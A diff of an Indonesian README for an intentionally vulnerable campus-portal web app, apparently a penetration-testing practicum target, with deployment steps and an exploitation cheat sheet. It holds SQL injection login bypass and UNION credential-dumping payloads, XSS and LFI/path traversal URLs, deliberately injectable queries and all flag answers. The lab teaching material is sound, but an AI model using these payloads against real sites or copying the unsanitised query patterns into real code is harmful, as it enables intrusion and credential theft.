@@ -1,179 +1,229 @@
-# 🏛️ Portal Informasi Akademik - Teknik Informatika (VulnLab-PHP v1.2)
+# 🏛️ Portal Informasi Akademik - Teknik Informatika (Next.js Edition)
 
-Aplikasi web portal kampus / jurusan yang tampak seperti **website normal dan profesional** (*Portal Berita, Layanan Akademik, dan Manajemen Laboratorium Teknik Informatika*). Di balik antarmuka yang realistis, aplikasi ini sengaja ditanami celah keamanan standar untuk keperluan praktikum **Network Penetration Testing (NPT)** dan pengujian keamanan siber.
+Aplikasi web target pengujian keamanan siber (*Vulnerable Web App*) berbasis **Next.js 15 (App Router)** yang dirancang dengan antarmuka **website kampus/portal normal yang bersih dan profesional** (*Portal Berita, Layanan Akademik, dan Manajemen Laboratorium Teknik Informatika*).
 
-Aplikasi dibangun menggunakan **PHP Native** murni dan basis data **MySQL**, tanpa framework berat, serta berstruktur file datar (*flat*) sehingga dapat langsung diunggah ke folder `htdocs` pada layanan shared hosting gratis seperti **InfinityFree**.
+Aplikasi ini siap di-deploy secara instan ke **Vercel** dengan **Zero-Configuration** (didukung *embedded in-memory database engine* sehingga tidak wajib memiliki server MySQL terpisah, namun tetap mendukung koneksi MySQL eksternal jika diinginkan).
 
 ---
 
-## 📂 Struktur Berkas (Flat di Root)
+## 📂 Struktur Berkas Proyek
 
 ```text
-htdocs/
-├── config.php               # Konfigurasi koneksi MySQL & Custom HTTP Header
-├── database.sql             # Skema & dump database (tabel users & posts berita)
-├── header.php               # Template header, navbar resmi portal kampus, & stylesheet
-├── footer.php               # Template footer & status diagnostik server
-├── index.php                # Beranda portal (berita terkini, layanan, & widget server)
-├── login.php                # Portal masuk staf/dosen (rentan SQL Injection Bypass)
-├── dashboard.php            # Dashboard civitas/admin (menampilkan FLAG utama)
-├── logout.php               # Skrip keluar sesi otentikasi
-├── search.php               # Arsip pencarian berita (rentan Reflected XSS & Union SQLi)
-├── view.php                 # Pusat dokumen (rentan Local File Inclusion / LFI)
-├── panduan_layanan.txt      # Berkas dokumen standar operasional akademik
-├── tentang_kami.txt         # Berkas profil visi & misi program studi
-├── standar_laboratorium.txt # Berkas tata tertib penggunaan laboratorium
-├── robots.txt               # Pengaturan sitemap mesin pencari (fuzzing discovery)
-├── backup-config.txt        # Berkas cadangan konfigurasi dummy yang terekspos
-├── secret-notes.txt         # Memo rahasia admin (target eksploitasi LFI)
-└── README.md                # Panduan instalasi hosting & solusi praktikum
+pentes/
+├── app/
+│   ├── layout.jsx               # Layout utama (topbar, navbar, dan footer)
+│   ├── page.jsx                 # Beranda portal (berita terkini & diagnostic widget)
+│   ├── globals.css              # Stylesheet bertema portal akademik
+│   ├── login/
+│   │   └── page.jsx             # Halaman portal login (rentan SQL Injection)
+│   ├── dashboard/
+│   │   ├── page.jsx             # Dashboard pengguna (menampilkan FLAG utama)
+│   │   └── logout-button.jsx    # Tombol keluar sesi
+│   ├── search/
+│   │   └── page.jsx             # Pencarian berita (rentan Reflected XSS & Union SQLi)
+│   ├── view/
+│   │   └── page.jsx             # Pusat dokumen (rentan Local File Inclusion / LFI)
+│   └── api/
+│       ├── auth/
+│       │   ├── login/route.js   # API login yang mengeksekusi raw SQL query
+│       │   ├── logout/route.js  # API logout
+│       │   └── me/route.js      # API pengecekan sesi cookie
+│       ├── posts/route.js       # API pencarian berita (rentan Union SQLi)
+│       └── view/route.js        # API pembaca berkas (rentan Path Traversal)
+├── lib/
+│   ├── db.js                    # Dual Database Layer (Remote MySQL + Embedded SQLite)
+│   └── session.js               # Manajemen sesi berbasis HTTP-only cookie
+├── public/
+│   ├── robots.txt               # Berkas robots untuk latihan fuzzing / discovery
+│   ├── backup-config.txt        # Berkas cadangan developer yang terekspos
+│   ├── secret-notes.txt         # Memo rahasia admin berisi flag LFI
+│   ├── database.sql             # Dump SQL (untuk import jika menggunakan MySQL)
+│   └── docs/
+│       ├── panduan_layanan.txt  # Berkas standar operasional akademik
+│       ├── tentang_kami.txt     # Berkas profil visi & misi jurusan
+│       └── standar_laboratorium.txt # Berkas tata tertib laboratorium
+├── php-version/                 # Arsip versi PHP Native (InfinityFree) terdahulu
+├── next.config.mjs              # Konfigurasi custom HTTP headers (X-Lab-Version)
+├── jsconfig.json                # Konfigurasi path alias (@/*)
+├── package.json                 # Dependensi & skrip Next.js
+└── README.md                    # Dokumentasi lengkap & panduan praktikum
 ```
 
 ---
 
-## 🚀 Panduan Deployment ke InfinityFree
+## 🚀 Panduan Deployment ke Vercel
 
-Berikut langkah mudah mempublikasikan portal target ke hosting gratis **InfinityFree**:
+### Cara 1: Deploy via GitHub & Vercel Dashboard (Paling Mudah)
 
-### Langkah 1: Buat Akun & Domain di InfinityFree
-1. Daftar atau masuk ke [https://www.infinityfree.com](https://www.infinityfree.com).
-2. Di dashboard, klik tombol **Create Account**.
-3. Pilih **Free Subdomain** (contoh: `portal-ti.great-site.net`).
-4. Tunggu beberapa detik hingga akun hosting aktif.
+1. **Inisialisasi Git & Push ke GitHub**:
+   Buka terminal di folder proyek ini (`e:\Project\pentes`):
+   ```bash
+   git init
+   git add .
+   git commit -m "feat: initial commit portal ti nextjs"
+   git branch -M main
+   git remote add origin https://github.com/USERNAME_ANDA/portal-akademik-ti.git
+   git push -u origin main
+   ```
 
----
-
-### Langkah 2: Buat Database MySQL di vPanel
-1. Buka akun hosting Anda lalu klik tombol **Control Panel** (vPanel).
-2. Cari bagian **Databases** dan klik menu **MySQL Databases**.
-3. Masukkan nama database (misalnya: `tiportal`), lalu klik **Create Database**.
-4. Catat informasi koneksi yang muncul di halaman tersebut:
-   - **MySQL Hostname**: contoh: `sql300.infinityfree.com`
-   - **MySQL Username**: contoh: `if0_38000000`
-   - **MySQL Password**: *(Password akun hosting vPanel Anda)*
-   - **MySQL Database Name**: contoh: `if0_38000000_tiportal`
-
----
-
-### Langkah 3: Import `database.sql` di phpMyAdmin
-1. Di halaman MySQL Databases vPanel, klik tombol **phpMyAdmin** pada database yang baru dibuat.
-2. Klik nama database Anda pada panel sebelah kiri phpMyAdmin.
-3. Klik tab **Import** pada menu atas.
-4. Klik **Choose File** / **Browse** lalu pilih file `database.sql`.
-5. Klik tombol **Go** / **Kirim** di bagian bawah.
-6. Pastikan tabel `users` dan `posts` berhasil terbuat dengan centang hijau.
+2. **Deploy di Vercel**:
+   - Kunjungi [https://vercel.com](https://vercel.com) dan login menggunakan akun GitHub Anda.
+   - Klik tombol **Add New...** &rarr; pilih **Project**.
+   - Pilih repositori `portal-akademik-ti` yang baru saja Anda push, lalu klik **Import**.
+   - Vercel akan otomatis mengenali framework **Next.js**.
+   - *(Opsional)* Jika ingin menghubungkan ke database MySQL eksternal (misal di TiDB Cloud, Aiven, atau cPanel hosting), masukkan variabel lingkungan di menu **Environment Variables**:
+     - `MYSQL_HOST`
+     - `MYSQL_USER`
+     - `MYSQL_PASSWORD`
+     - `MYSQL_DATABASE`
+     - `MYSQL_PORT` *(default: 3306)*
+   - Jika **tidak** diisi, aplikasi akan otomatis menggunakan **Embedded Engine (Zero-Config)** yang langsung bekerja tanpa setup database eksternal!
+   - Klik tombol **Deploy**.
+   - Dalam ~1 menit, aplikasi web Anda aktif di domain publik gratis: `https://portal-akademik-ti.vercel.app`.
 
 ---
 
-### Langkah 4: Sesuaikan Berkas `config.php`
-Buka berkas `config.php` dengan editor teks, sesuaikan 4 variabel database dengan data dari Langkah 2:
+### Cara 2: Deploy Langsung via Vercel CLI
 
-```php
-$db_host = "sql300.infinityfree.com";      // Host MySQL dari vPanel
-$db_user = "if0_38000000";                // Username MySQL dari vPanel
-$db_pass = "PasswordHostingAnda";         // Password akun vPanel InfinityFree
-$db_name = "if0_38000000_tiportal";       // Nama database MySQL lengkap
+1. Pastikan Vercel CLI terpasang di komputer Anda:
+   ```bash
+   npm install -g vercel
+   ```
+2. Jalankan perintah deploy di folder proyek:
+   ```bash
+   vercel
+   ```
+   Ikuti instruksi interaktif di terminal (pilih scope akun, link to existing project: No, project name: `portal-akademik-ti`).
+3. Untuk deployment ke production:
+   ```bash
+   vercel --prod
+   ```
+
+---
+
+## 💻 Menjalankan di Komputer Lokal
+
+Jika ingin menjalankan aplikasi secara lokal di laptop:
+
+```bash
+# 1. Masuk ke direktori proyek
+cd e:\Project\pentes
+
+# 2. Pasang dependensi (jika belum)
+npm install
+
+# 3. Jalankan development server
+npm run dev
+
+# Buka http://localhost:3000 di browser Anda.
 ```
-
----
-
-### Langkah 5: Unggah Semua Berkas ke Folder `htdocs`
-1. Di vPanel InfinityFree, klik **Online File Manager** (atau gunakan **FileZilla** dengan host `ftpupload.net`, port 21).
-2. Masuk ke dalam folder **`htdocs`**.
-3. Hapus berkas bawaan seperti `default2.html` atau `index2.html`.
-4. Unggah seluruh isi file proyek ini langsung ke dalam folder `htdocs`.
-5. Buka domain Anda di browser (`http://portal-ti.great-site.net/`).
 
 ---
 
 ## 🎯 Panduan & Kunci Eksploitasi Praktikum (Cheat Sheet)
 
 ### 1. HTTP Service Discovery & Banner Grabbing
-Server mengirimkan custom response header yang dapat divalidasi mahasiswa:
+Server Next.js telah dikonfigurasi melalui `next.config.mjs` untuk mengirimkan custom header respons:
 ```bash
-# Validasi Header dengan cURL
-curl -I http://portal-ti.great-site.net/
+# Banner Grabbing dengan cURL
+curl -I https://portal-akademik-ti.vercel.app/
 
-# Service Detection dengan Nmap
-nmap -sV -sC -p 80,443 portal-ti.great-site.net
+# Service & Version Detection dengan Nmap
+nmap -sV -sC -p 80,443 portal-akademik-ti.vercel.app
 ```
-**Temuan**:
-- Header: `X-Lab-Version: VulnLab-PHP/1.2`
-- Header: `X-Target-Server: NPT-Lab-Teknik-Informatika`
+**Temuan Header Respons**:
+- `X-Lab-Version: VulnLab-PHP/1.2`
+- `X-Target-Server: NPT-Lab-Teknik-Informatika`
+- `X-Powered-By: Next.js`
 
 ---
 
-### 2. Information Disclosure & Enumerasi File (Robots & Backup)
+### 2. Information Disclosure & Enumerasi File
+Fuzzing direktori web menggunakan Gobuster atau Dirsearch:
 ```bash
-gobuster dir -u http://portal-ti.great-site.net/ -w /usr/share/wordlists/dirb/common.txt -x txt,php,sql
+gobuster dir -u https://portal-akademik-ti.vercel.app/ -w /usr/share/wordlists/dirb/common.txt -x txt,json,sql
 ```
-- Akses `robots.txt` &rarr; **Flag 1:** `FLAG{Robots_Txt_Discovery_Success_8841}`
-- Akses `backup-config.txt` &rarr; **Flag 2:** `FLAG{Sensitive_Backup_File_Exposed_4492}`
+**Temuan**:
+- `https://portal-akademik-ti.vercel.app/robots.txt`
+  &rarr; **Flag 1:** `FLAG{Robots_Txt_Discovery_Success_8841}`
+- `https://portal-akademik-ti.vercel.app/backup-config.txt`
+  &rarr; **Flag 2:** `FLAG{Sensitive_Backup_File_Exposed_4492}`
 
 ---
 
 ### 3. SQL Injection Authentication Bypass (Portal Masuk)
-Halaman `login.php` memproses query langsung tanpa sanitasi:
-`SELECT * FROM users WHERE username = '$username' AND password = '$password'`
+Portal login pada halaman `/login` memproses query autentikasi:
+`SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`
 
-- Buka `http://portal-ti.great-site.net/login.php`
-- Masukkan Username: `' OR '1'='1` atau `admin' -- `
-- Password: *(kosongkan atau isi sembarang)*
-- Klik **Masuk ke Akun** &rarr; Berhasil masuk ke `dashboard.php`
-- **Flag 3:** `FLAG{SQL_Injection_Success}`
+**Langkah Eksploitasi**:
+1. Buka `https://portal-akademik-ti.vercel.app/login`.
+2. Pada kolom **ID Pengguna / Username**:
+   - `' OR '1'='1`
+   - atau `admin' -- `
+3. Kolom **Kata Sandi**: *(kosongkan atau isi sembarang)*.
+4. Klik **Masuk ke Akun**.
+5. Sistem berhasil melewati otentikasi dan mengarahkan ke `/dashboard`.
+6. **Flag 3:** `FLAG{SQL_Injection_Success}`
 
 ---
 
 ### 4. Reflected XSS & Union-based SQL Injection (Pencarian Berita)
-Halaman `search.php` memiliki dua kerentanan:
+Halaman `/search` memiliki dua kerentanan:
 
-**A. Reflected XSS:**
-Parameter `?q=` dicetak langsung tanpa sanitasi HTML:
-```text
-http://portal-ti.great-site.net/search.php?q=<script>alert('FLAG{Reflected_XSS_Success}')</script>
-```
+#### A. Reflected Cross-Site Scripting (XSS)
+Parameter `?q=` direfleksikan ke dalam DOM tanpa sanitasi HTML menggunakan `dangerouslySetInnerHTML`:
+- **PoC XSS**:
+  ```text
+  https://portal-akademik-ti.vercel.app/search?q=<script>alert('FLAG{Reflected_XSS_Success}')</script>
+  ```
+- **PoC Alternatif**:
+  ```text
+  https://portal-akademik-ti.vercel.app/search?q=<img+src=x+onerror=alert('XSS-NPT')>
+  ```
 
-**B. Union-based SQL Injection:**
-Tabel `posts` memiliki 5 kolom `(id, title, category, content, author)`:
-```text
-http://portal-ti.great-site.net/search.php?q=%27+UNION+SELECT+1%2C+username%2C+role%2C+flag%2C+password+FROM+users+--+
-```
-Data seluruh akun dan password dosen/admin akan tampil menyerupai artikel pengumuman!
+#### B. Union-based SQL Injection
+Tabel `posts` mengembalikan 5 kolom `(id, title, category, content, author)`:
+- **PoC Eksfiltrasi Data Tabel Users**:
+  ```text
+  https://portal-akademik-ti.vercel.app/search?q=test%27+UNION+SELECT+1%2C+username%2C+role%2C+flag%2C+password+FROM+users+--+
+  ```
+  Data akun, password, dan token seluruh pengguna akan tampil menyerupai kartu artikel berita!
 
 ---
 
-### 5. Local File Inclusion (Pusat Dokumen)
-Halaman `view.php` menggunakan fungsi `include($_GET['page'])`:
+### 5. Local File Inclusion & Path Traversal (Pusat Dokumen)
+Halaman `/view` memproses parameter `?page=` menggunakan `fs.readFile()` tanpa validasi `path.basename()` atau whitelist:
 
-**A. Membaca Memo Rahasia:**
+**A. Membaca Memo Rahasia Administrator**:
 ```text
-http://portal-ti.great-site.net/view.php?page=secret-notes.txt
+https://portal-akademik-ti.vercel.app/view?page=public/secret-notes.txt
 ```
 **Flag 4:** `FLAG{Local_File_Inclusion_Bypass_Master_1029}`
 
-**B. Source Code Disclosure via PHP Wrapper:**
+**B. Membaca Berkas Konfigurasi Cadangan**:
 ```text
-http://portal-ti.great-site.net/view.php?page=php://filter/convert.base64-encode/resource=config.php
+https://portal-akademik-ti.vercel.app/view?page=public/backup-config.txt
 ```
-Decode base64 di terminal untuk membaca kredensial database asli:
-```bash
-echo "STRING_BASE64" | base64 -d
+
+**C. Path Traversal Membaca Konfigurasi Proyek**:
+```text
+https://portal-akademik-ti.vercel.app/view?page=package.json
 ```
 
 ---
 
-## 🚩 Rekapitulasi String FLAG Praktikum
+## 🚩 Rekapitulasi Seluruh String FLAG
 
-| No | Modul Tantangan | Lokasi / File | String FLAG |
+| No | Modul Tantangan | Lokasi / File Target | String FLAG |
 |---|---|---|---|
-| 1 | Web Content Enumeration | `robots.txt` | `FLAG{Robots_Txt_Discovery_Success_8841}` |
-| 2 | Sensitive File Exposure | `backup-config.txt` | `FLAG{Sensitive_Backup_File_Exposed_4492}` |
-| 3 | SQL Injection Login Bypass | `login.php` &rarr; `dashboard.php` | `FLAG{SQL_Injection_Success}` |
+| 1 | Web Content Enumeration | `/robots.txt` | `FLAG{Robots_Txt_Discovery_Success_8841}` |
+| 2 | Sensitive File Exposure | `/backup-config.txt` | `FLAG{Sensitive_Backup_File_Exposed_4492}` |
+| 3 | SQL Injection Login Bypass | `/login` &rarr; `/dashboard` | `FLAG{SQL_Injection_Success}` |
 | 4 | SQLi Admin Data Exfil | Tabel `users` (id=1) | `FLAG{SQLi_Admin_Access_Unlocked_7731}` |
-| 5 | Reflected XSS | `search.php?q=...` | `FLAG{Reflected_XSS_Success}` |
-| 6 | Local File Inclusion (LFI) | `view.php?page=secret-notes.txt` | `FLAG{Local_File_Inclusion_Bypass_Master_1029}` |
+| 5 | Reflected XSS | `/search?q=...` | `FLAG{Reflected_XSS_Success}` |
+| 6 | Local File Inclusion (LFI) | `/view?page=public/secret-notes.txt` | `FLAG{Local_File_Inclusion_Bypass_Master_1029}` |
 
 ---
 
 ## ⚖️ Disclaimer
-Aplikasi ini ditujukan murni untuk keperluan akademik dan edukasi keamanan siber di lingkungan laboratorium terkontrol.
+Aplikasi ini dikembangkan semata-mata untuk tujuan riset, edukasi, dan praktikum keamanan siber di lingkungan laboratorium akademik terkontrol.
